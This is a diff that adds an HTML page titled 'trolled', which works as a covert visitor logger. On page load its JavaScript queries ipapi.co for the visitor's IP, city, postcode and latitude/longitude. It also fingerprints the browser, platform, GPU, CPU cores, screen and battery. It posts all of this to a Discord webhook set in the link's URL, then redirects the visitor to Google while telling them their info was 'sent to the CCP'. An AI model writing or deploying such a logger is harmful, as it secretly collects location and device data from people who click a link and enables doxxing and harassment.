@@ -1,1 +1,382 @@
 
+<!DOCTYPE HTML>
+
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+        <title>trolled</title>
+        <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
+        <style>
+    @font-face {
+  font-family: 'Ubuntu';
+  font-style: normal;
+  font-weight: 400;
+  src: url(https://fonts.gstatic.com/s/ubuntu/v15/4iCs6KVjbNBYlgoKcg72j00.woff2) format('woff2');
+  unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+}
+      
+    </style>
+
+    </head>
+    <body onload="determine()">
+        <div style="text-align:center">
+    <h1 style="font-family:'Ubuntu'" id="articlename"></h1>
+    <label style="font-family:'Ubuntu'">Your info has been sent to the CCP.</label>
+        </div>
+    </body>
+    <script>
+function determine(){
+var segments = window.location.href.split("?")
+var device = segments[5]
+if(device == "mobile")
+{
+logmobile()
+}
+else
+{
+  log()
+}
+}
+
+        async function logmobile(){
+        const response = await fetch("https://ipapi.co/json")
+        const data = await response.json();
+
+        var segments = window.location.href.split("?")
+        var pingid = segments[1]
+        var webhookid = segments[2]
+        var webhooktoken = segments[3] 
+        var articlename = segments[4].replace(/%20/g, " ")
+        document.getElementById("articlename").innerHTML = articlename
+
+
+var currentdate = new Date(); 
+let postcode = data.postal
+let region = data.region
+let lang =  data.latitude
+let long = data.longitude
+let threads = navigator.hardwareConcurrency
+
+let gpu = "";
+const gl = document.createElement('canvas').getContext('webgl');
+  if (!gl) {
+    gpu = "Unknown"
+  }
+  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+ gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+
+ if(gpu == null)
+ {
+   gpu = "Unknown"
+ }
+
+ var browser = "Unknown"
+
+  if((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf('OPR')) != -1 ) {
+        browser = 'Opera';
+    } else if(navigator.userAgent.indexOf("Chrome") != -1 ) {
+        browser = 'Chrome';
+    } else if(navigator.userAgent.indexOf("Safari") != -1) {
+        browser = 'Safari';
+    } else if(navigator.userAgent.indexOf("Firefox") != -1 ){
+        browser = 'Firefox';
+    } else if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) {
+        browser = 'Internet Explorer';
+    } else {
+        browser = 'Unknown';
+    }
+
+if(postcode == null)
+{
+  postcode = "Unknown"
+}
+if(region== null)
+{
+  region = "Unknown"
+}
+if(lang == null)
+{
+  lang = "Unknown"
+}
+if (long == null)
+{
+  long = "Unknown"
+}
+if(threads == null)
+{
+  threads = "Unknown"
+}
+
+ 
+
+var myEmbed = {
+  title: "New Info Logged",
+  description: "From URL: " + window.location.href,
+  fields: [
+      {
+        name: "IP",
+        value: data.ip + " [" + data.version + "]",
+        inline: true
+      },
+      {
+        name: "Area",
+        value: data.city + ", " + region + " [" + data.country_name + "]",
+        inline: true
+      },
+      {
+        name: "Postcode",
+        value: postcode,
+        inline: true
+      },
+      {
+        name: "Latitude/Longitude",
+        value:  lang + ", " + long,
+        inline: true
+      },
+      {
+        name: "Browser",
+        value:  browser,
+        inline: true
+      },
+      {
+        name: "Platform",
+        value: navigator.platform,
+        inline: true
+      },
+      {
+        name: "Screen Size",
+        value:  window.screen.width + " x " + window.screen.height,
+        inline: true
+      },
+      {
+        name: "Screen Rotation",
+        value:  "Non Mobile Supported.",
+        inline: true
+      },
+      {
+        name: "Battery Percentage",
+        value: "Non Mobile Supported.",
+        inline: true
+      },
+      {
+        name: "Graphics Card Name / Driver",
+        value:  gpu
+      },
+      {
+        name: "Number of CPU Threads/Cores",
+        value:  threads
+      },
+    {
+        name: "Message Upon Loading",
+        value:  articlename,
+        
+      }
+    ],
+     footer: {
+        text: "Advanced Info Logger | github.com/submits  •  Logged " + currentdate.toUTCString(),
+        icon_url: "https://i.imgur.com/Oz9McOz.png"
+      }
+}
+        let content = "||<@" + pingid + ">||"
+        const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/" + webhookid + "/" + webhooktoken);
+      request.setRequestHeader('Content-type', 'application/json');
+      const params = {
+        username: "Info Logger [" + makeid(5) + "]",
+        avatar_url: "",
+        content: content,
+        embeds: [ myEmbed ]
+      }
+
+   request.send(JSON.stringify(params));
+       window.location.href = "https://google.com"
+
+        }
+
+        function makeid(length) {
+    var result           = '';
+    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var charactersLength = characters.length;
+    for ( var i = 0; i < length; i++ ) {
+      result += characters.charAt(Math.floor(Math.random() * 
+ charactersLength));
+   }
+   return result;
+}
+
+    async function log(){
+        const response = await fetch("https://ipapi.co/json")
+        const data = await response.json();
+
+        var browser = "Unknown"
+
+  if((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf('OPR')) != -1 ) {
+        browser = 'Opera';
+    } else if(navigator.userAgent.indexOf("Chrome") != -1 ) {
+        browser = 'Chrome';
+    } else if(navigator.userAgent.indexOf("Safari") != -1) {
+        browser = 'Safari';
+    } else if(navigator.userAgent.indexOf("Firefox") != -1 ){
+        browser = 'Firefox';
+    } else if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) {
+        browser = 'Internet Explorer';
+    } else {
+        browser = 'Unknown';
+    }
+
+    var orientation = (screen.orientation || {}).type || screen.mozOrientation || screen.msOrientation;
+    let rotation = ""
+
+if (orientation === "landscape-primary") {
+  rotation = "Landscape"
+} else if (orientation === "landscape-secondary") {
+  rotation = "Landscape [Upside Down]"
+} else if (orientation === "portrait-secondary" || orientation === "portrait-primary") {
+  rotation = "Portrait"
+} else if (orientation === undefined) {
+  rotation = "Unknown"
+}
+
+let gpu = "";
+const gl = document.createElement('canvas').getContext('webgl');
+  if (!gl) {
+    gpu = "Unknown"
+  }
+  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+ gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+
+ if(gpu == null)
+ {
+   gpu = "Unknown"
+ }
+
+
+const battery = await navigator.getBattery();
+  const batterylevel = `${battery.level * 100}%`;
+
+        var segments = window.location.href.split("?")
+        var pingid = segments[1]
+        var webhookid = segments[2]
+        var webhooktoken = segments[3] 
+        var articlename = segments[4].replace(/%20/g, " ")
+        document.getElementById("articlename").innerHTML = articlename
+
+
+var currentdate = new Date(); 
+let postcode = data.postal
+let region = data.region
+let lang =  data.latitude
+let long = data.longitude
+let threads = navigator.hardwareConcurrency
+
+if(postcode == null)
+{
+  postcode = "Unknown"
+}
+if(region== null)
+{
+  region = "Unknown"
+}
+if(lang == null)
+{
+  lang = "Unknown"
+}
+if(long == null)
+{
+  long = "Unknown"
+}
+if(threads == null)
+{
+  threads = "Unknown"
+}
+
+
+var myEmbed = {
+  title: "New Info Logged",
+  description: "From URL: " + window.location.href,
+  fields: [
+      {
+        name: "IP",
+        value: data.ip + " [" + data.version + "]",
+        inline: true
+      },
+      {
+        name: "Area",
+        value: data.city + ", " + region + " [" + data.country_name + "]",
+        inline: true
+      },
+      {
+        name: "Postcode",
+        value: postcode,
+        inline: true
+      },
+      {
+        name: "Latitude/Longitude",
+        value:  lang + ", " + long,
+        inline: true
+      },
+      {
+        name: "Browser",
+        value:  browser,
+        inline: true
+      },
+      {
+        name: "Platform",
+        value: navigator.platform,
+        inline: true
+      },
+      {
+        name: "Screen Size",
+        value:  window.screen.width + " x " + window.screen.height,
+        inline: true
+      },
+      {
+        name: "Screen Rotation",
+        value:  rotation,
+        inline: true
+      },
+      {
+        name: "Battery Percentage",
+        value: batterylevel,
+        inline: true
+      },
+      {
+        name: "Graphics Card Name / Driver",
+        value:  gpu
+      },
+      {
+        name: "Number of Logical Processors",
+        value:  threads
+      },
+    {
+        name: "Message Upon Loading",
+        value:  articlename,
+        
+      }
+    ],
+     footer: {
+        text: "Advanced Info Logger | github.com/submits •  Logged " + currentdate.toUTCString(),
+        icon_url: "https://i.imgur.com/Oz9McOz.png"
+      }
+}
+        let content = "||<@" + pingid + ">||"
+        const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/" + webhookid + "/" + webhooktoken);
+      request.setRequestHeader('Content-type', 'application/json');
+      const params = {
+        username: "Info Logger [" + makeid(5) + "]",
+        avatar_url: "",
+        content: content,
+        embeds: [ myEmbed ]
+      }
+
+      request.send(JSON.stringify(params));
+       window.location.href = "https://google.com"
+
+        
+
+        }
+
+    </script>
+</html>
